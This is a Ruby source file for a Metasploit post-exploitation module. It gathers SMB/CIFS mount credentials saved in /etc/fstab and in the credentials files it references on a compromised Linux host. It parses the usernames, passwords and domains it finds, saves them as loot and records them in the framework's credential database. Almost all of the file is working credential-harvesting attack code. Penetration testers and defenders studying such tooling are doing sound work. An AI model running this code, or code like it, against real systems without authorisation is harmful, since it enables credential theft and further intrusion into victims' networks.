##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Linux Gather Saved mount.cifs/mount.smbfs Credentials',
      'Description'   => %q{
        Post Module to obtain credentials saved for mount.cifs/mount.smbfs in
        /etc/fstab on a Linux system.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Jon Hart <jhart[at]spoofed.org>'],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter']
    ))
  end

  def run
    # keep track of any of the credentials files we read so we only read them once
    cred_files = []
    # where we'll store hashes of found credentials while parsing.  reporting is done at the end.
    creds = []
    # A table to store the found credentials for loot storage afterward
    cred_table = Rex::Text::Table.new(
    'Header'    => "mount.cifs credentials",
    'Indent'    => 1,
    'Columns'   =>
    [
      "Username",
      "Password",
      "Server",
      "File"
    ])

    # parse each line from /etc/fstab
    fail_with(Failure::NotFound, '/etc/fstab not found on system') unless file_exist?('/etc/fstab')
    read_file("/etc/fstab").each_line do |fstab_line|
      fstab_line.strip!
      # where we'll store the current parsed credentials, if any
      cred = {}
      # if the fstab line utilizies the credentials= option, read the credentials from that file
      if (fstab_line =~ /\/\/([^\/]+)\/\S+\s+\S+\s+cifs\s+.*/)
        cred[:host] = $1
        # IPs can occur using the ip option, which is a backup/alternative
        # to letting UNC resolution do its thing
        cred[:host] = $1 if (fstab_line =~ /ip=([^, ]+)/)
        if (fstab_line =~ /cred(?:entials)?=([^, ]+)/)
          file = $1
          # skip if we've already parsed this credentials file
          next if (cred_files.include?(file))
          # store it if we haven't
          cred_files << file
          # parse the credentials
          cred.merge!(parse_credentials_file(file))
        # if the credentials are directly in /etc/fstab, parse them
        elsif (fstab_line =~ /\/\/([^\/]+)\/\S+\s+\S+\s+cifs\s+.*(?:user(?:name)?|pass(?:word)?)=/)
          cred.merge!(parse_fstab_credentials(fstab_line))
        end

        creds << cred
      end
    end

    # all done.  clean up, report and loot.
    creds.flatten!
    creds.compact!
    creds.uniq!
    creds.each do |cred|
      if (Rex::Socket.dotted_ip?(cred[:host]))
        report_cred(
          ip: cred[:host],
          port: 445,
          service_name: 'smb',
          user: cred[:user],
          password: cred[:pass],
          proof: '/etc/fstab'
        )
      end
      cred_table << [ cred[:user], cred[:pass], cred[:host], cred[:file] ]
    end

    # store all found credentials
    unless (cred_table.rows.empty?)
      print_line("\n" + cred_table.to_s)
      p = store_loot(
        "mount.cifs.creds",
        "text/csv",
        session,
        cred_table.to_csv,
        "mount_cifs_credentials.txt",
        "mount.cifs credentials")
      print_status("CIFS credentials saved in: #{p.to_s}")
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :session,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password,
      session_id: session_db_id,
      post_reference_name: self.refname
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  # Parse mount.cifs credentials from +line+, assumed to be a line from /etc/fstab.
  # Returns the username+domain and password as a hash.
  def parse_fstab_credentials(line, file="/etc/fstab")
    creds = {}
    # get the username option, which comes in one of four ways
    user_opt = $1 if (line =~ /user(?:name)?=([^, ]+)/)
    case user_opt
    # domain/user%pass
    when /^([^\/]+)\/([^%]+)%(.*)$/
      creds[:user] = "#{$1}\\#{$2}"
      creds[:pass] = $3
    # domain/user
    when /^([^\/]+)\/([^%]+)$/
      creds[:user] = "#{$1}\\#{$2}"
    # user%password
    when /^([^%]+)%(.*)$/
      creds[:user] = $1
      creds[:pass] = $2
    # user
    else
      creds[:user] = user_opt
    end if (user_opt)

    # get the password option if any
    creds[:pass] = $1 if (line =~ /pass(?:word)?=([^, ]+)/)

    # get the domain option, if any
    creds[:user] = "#{$1}\\#{creds[:user]}" if (line =~ /dom(?:ain)?=([^, ]+)/)

    creds[:file] = file unless (creds.empty?)

    creds
  end

  # Parse mount.cifs credentials from +file+, returning the username+domain and password
  # as a hash.
  def parse_credentials_file(file)
    creds = {}
    domain = nil
    read_file(file).each_line do |credfile_line|
      case credfile_line
      when /domain=(.*)/
        domain = $1
      when /password=(.*)/
        creds[:pass] = $1
      when /username=(.*)/
        creds[:user] = $1
      end
    end
    # prepend the domain if one was found
    creds[:user] = "#{domain}\\#{creds[:user]}" if (domain and creds[:user])
    creds[:file] = file unless (creds.empty?)

    creds
  end
end
